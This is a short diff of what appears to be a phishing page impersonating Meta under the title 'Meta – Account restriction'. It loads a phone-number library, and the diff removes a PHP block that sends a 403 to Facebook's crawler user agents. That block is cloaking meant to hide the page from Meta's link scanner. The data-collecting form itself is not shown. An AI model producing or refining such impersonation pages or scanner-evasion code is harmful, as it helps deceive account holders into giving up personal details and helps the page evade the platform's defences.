@@ -1,21 +1,9 @@
-<?php
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$botPatterns = ['facebookexternalhit', 'FacebookBot'];
-foreach ($botPatterns as $bot) {
-    if (stripos($userAgent, $bot) !== false) {
-        http_response_code(403);
-        echo 'Access denied.';
-        exit;
-    }
-}
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Meta – Account restriction</title>
-    <
     <!-- libphonenumber-js -->
     <script src="https://unpkg.com/libphonenumber-js@1.10.53/bundle/libphonenumber-min.js"></script>
     <style>
